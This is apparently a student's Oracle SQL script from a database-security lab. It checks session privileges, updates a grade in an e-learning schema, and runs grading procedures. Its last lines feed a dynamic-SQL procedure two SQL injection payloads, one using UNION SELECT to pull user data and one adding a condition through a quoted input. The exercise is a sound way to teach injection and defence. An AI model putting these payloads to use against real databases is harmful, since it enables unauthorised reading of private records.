select * from session_privs;
select * from session_roles;
select * from user_tab_privs;
select * from user_col_privs;

--Lab 4
select * from elearn_app_admin.rezolva;

update elearn_app_admin.rezolva
set nota = 9
where id_tema=2 and id_stud=1;

--3
execute elearn_app_admin.proc_notare(1, 2, 103, 10);
execute elearn_app_admin.proc_notare(2, 2, 103, 8);

--Lab 5
--2
execute elearn_app_admin.gasiti_pericole('2021');
execute elearn_app_admin.gasiti_pericole('01-2022');

--'SELECT * FROM REZOLVA WHERE TO_CHAR(DATA_UPLOAD,''DD-MM-YYYY HH24:MI:SS'') LIKE''%'||P_DATAUP||'%'''
execute elearn_app_admin.gasiti_pericole('01-2022%'' union select -99 as idtema, id as idstud, an_intrare as data_upload, -99 as idnota, -99 as idcorector from utilizator where numeuser like ''');
execute elearn_app_admin.gasiti_pericole('2021%'' and id_stud in (select id from student where reluare_studii=1) and ''AAA'' like ''');
